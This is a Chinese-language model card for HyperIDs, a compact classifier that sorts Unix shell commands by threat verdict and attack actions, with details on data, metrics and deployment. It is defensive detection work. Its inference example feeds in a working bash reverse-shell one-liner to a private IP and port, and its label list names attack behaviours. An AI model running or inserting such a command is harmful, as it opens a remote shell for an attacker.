# HyperIDs 模型卡（最新 / v2）

## 概览

- **项目/模型名**：HyperIDs
- **任务**：Unix shell 命令/脚本的威胁分类
- **框架**：GLiClass（第三方多标签分类框架）
- **骨干编码器**：`prajjwal1/bert-small`（4 层 / 512 维 / 8 头，WordPiece）
- **参数量**：29.8M（≤30M）
- **训练**：Lightning L4 GPU，4 epochs，batch 32，lr 5e-5

## 标签体系（v2 schema）

- **verdict（互斥 3）**：`benign` / `suspicious` / `malicious`
- **action（多标签 28）**：
  `download`, `execute_local`, `download_execute`, `command_and_control`,
  `obfuscate`, `file_operation`, `process_inject`, `network_scan`, `brute_force`,
  `reverse_shell`, `bind_shell`, `web_shell`, `backdoor`, `keylog`, `credential_dump`,
  `ransomware`, `cryptomining`, `exfiltrate`, `disable_security`, `clear_logs`,
  `timestomp`, `account_add`, `registry_persist`, `service_persist`, `schedule_persist`,
  `self_propagate`, `system_probe`, `environment_setup`
- **MITRE tactic/technique**：不预测，由 `schema.derive_attck(actions)` 规则表确定性推导。

## 数据

| split | 样本数 |
|---|---|
| train | 65,480 |
| val | 5,978 |
| test | 5,978 |

- 来源：QuasarNix（恶意）+ NL2Bash（良性）+ LLM 合成 + 红队变体。
- 教师：Jev（`jev-1.13.0`）——唯一软标签来源，199 维软标签 74,743 条。
- 标签映射：`199 → 31` 确定性映射（verdict 1:1，action 多对一求和）。
- verdict 分布（全量）：benign 28,688 / malicious 27,818 / suspicious 20,930。
- action 覆盖：28/28 全部有正样本；support 范围 28（最小）~ 35,539（最大，command_and_control）。

## 指标（test 5,978）

| 指标 | fp32 | INT8（部署） |
|---|---|---|
| **verdict_acc** | 0.9167 | **0.9187** |
| **action micro-F1** | 0.9090 | **0.9099** |
| action precision | 0.9351 | 0.9338 |
| action recall | 0.8843 | 0.8871 |

## 部署

| 项 | 值 |
|---|---|
| INT8 ONNX 体积 | **30.2MB** |
| fp32 ONNX | 118MB（external data） |
| C 运行时峰值 RSS | fp32 114.7MB / **INT8 96.2MB（<100MB ✅）** |
| INT8 vs fp32 | 基本无损（见上表） |

## 产物位置

- checkpoint / ONNX：`model/checkpoints_gpu/final_model_v2/`
  - `model.safetensors`（119MB）
  - `model.onnx` + `model.onnx.data`（fp32）
  - `model_int8.onnx`（30.2MB）
- schema：`label_schema.yaml` + `schema.py`（当前 31 标签）
- 训练/评估/推理：`model/train.py` / `model/eval.py` / `model/predict.py`
- 历史实验：`model/experiments/`（v1 electra / v2 gliclass-edge / v3 bert-132）

## 推理示例

```bash
python -m model.predict "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
# verdict   : verdict.malicious
# actions   : command_and_control, reverse_shell
# tactics   : command_and_control, initial_access
# techniques: T1059, T1071
```
